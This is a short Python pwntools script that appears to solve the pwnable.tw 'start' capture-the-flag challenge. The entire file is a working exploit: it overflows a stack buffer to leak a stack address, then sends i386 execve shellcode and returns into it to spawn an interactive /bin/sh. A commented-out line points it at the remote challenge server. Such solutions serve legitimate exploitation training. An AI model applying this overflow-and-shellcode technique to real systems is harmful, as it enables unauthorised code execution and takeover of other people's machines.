from pwn import *

exe = ELF('./start', checksec=False)
p = process(exe.path)
# p = remote("chall.pwnable.tw", 10000)

# leak
rop = 0x08048086
payload = b'a'*20 + p32(rop)
p.sendafter(b'CTF:', payload)
leak = u32(p.recv(4))
print("Leak: " + hex(leak))

input()

# shellcode
shellcode = asm(
    '''
    mov al, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''', arch='i386')
payload = shellcode
payload = payload.ljust(20)
payload += p32(leak - 4) + b'/bin/sh\0'
p.send(payload)

p.interactive()